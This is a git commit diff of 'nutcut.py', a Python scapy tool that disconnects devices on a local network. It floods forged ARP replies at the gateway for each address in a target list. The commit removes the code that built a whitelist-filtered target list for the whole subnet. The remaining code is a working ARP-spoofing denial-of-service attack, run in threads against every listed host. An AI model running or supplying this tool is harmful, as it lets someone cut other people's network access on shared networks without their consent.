84e1512fb643a667d93eb66f43c58592aa60c162
reusteur73 <92535962+reusteur73@users.noreply.github.com>
2023-04-19 18:29:00 +0200

    Update nutcut.py

--- nutcut.py
+++ nutcut.py
@@ -1,51 +1,6 @@
 from warnings import filterwarnings
 filterwarnings("ignore")
 from scapy.all import *
-import subprocess, locale
-
-def getOwnIp():
-    cmd = "ipconfig | findstr IPv4"
-    output = subprocess.check_output(cmd, shell=True)
-    encoding = locale.getpreferredencoding()
-    ownip = str(output.decode(encoding)).split(":")[1].strip()
-    print(f"Your current IP is : {ownip}")
-    print("Check if this ip is you're real local ip with ifconfig or ipconfig")
-    answer = input(f"Is {ownip} ip correct ? Y or N :")
-    if answer.lower() == "y":
-        return ownip
-    else:
-        realLocalIp = input("Enter real local ip: ")
-        return realLocalIp
-
-ownIp = getOwnIp()
-
-def createIpList(ownip):
-    exeptions = input("Would you like to whitelist any other IP(s) than you're ? Y or N : ")
-    whitelist = []
-    if str(exeptions).lower() == "y":
-        ExIps = input("Enter IP(s) separate by comma. Example 192.168.1.22,192.168.1.23,192.168.1.24 : ")
-        ExIpsList = ExIps.split(",")
-        for Ipps in ExIpsList:
-            subIp = str(Ipps).split(".")[-1]
-            whitelist.append(subIp)
-    subIp = str(ownip).split(".")[-1]
-    print('subip:',subIp)
-    baseIp = ".".join(str(ownip).split(".")[:3])
-    MAX = 254
-    f = open("target_ips.txt", "w")
-    try:
-        for i in range(1, MAX+1):
-            if i != int(subIp):
-                if str(i) not in whitelist:
-                    txt = baseIp + f".{i}\n"
-                    f.write(txt)
-        f.close()
-    except Exception:
-        print("It seems like you're local ip is False or something went wrong...")
-        exit()
-    return whitelist
-
-whiteListIps = createIpList(ownIp)
 
 try:
     gateway_ip = conf.route.route("0.0.0.0")[2]
@@ -57,7 +12,7 @@ def nutcut(target_ip):
     pkt = ARP(psrc=target_ip, pdst=gateway_ip)
     send(pkt, verbose=0, loop=1)
 
-def main(ExIpsList):
+def main():
     import threading
     import os
 
@@ -73,19 +28,19 @@ def main(ExIpsList):
     if not target_list:
         print("Error: target_ips.txt is empty. Please edit it first")
         return
+    
+    print(f"Target Count: {len(target_list)}\n")
 
     for target_ip in target_list:
         print(f"NutCut initializing agaisn't {target_ip}")
         threading.Thread(target=nutcut, args=[target_ip], daemon=True).start()
-
+    
     try:
-        print(f"Target Count: {len(target_list)}\n")
-        print(f"WhiteListed IPs : {whiteListIps} + You're own IP")
         input("\n: Press Enter or CTRL+C to stop :")
     except KeyboardInterrupt:
         return
 
 if __name__ == "__main__":
     print("\033[?25l", end="")
-    main(whiteListIps)
+    main()
     print("\033[?25h", end="")
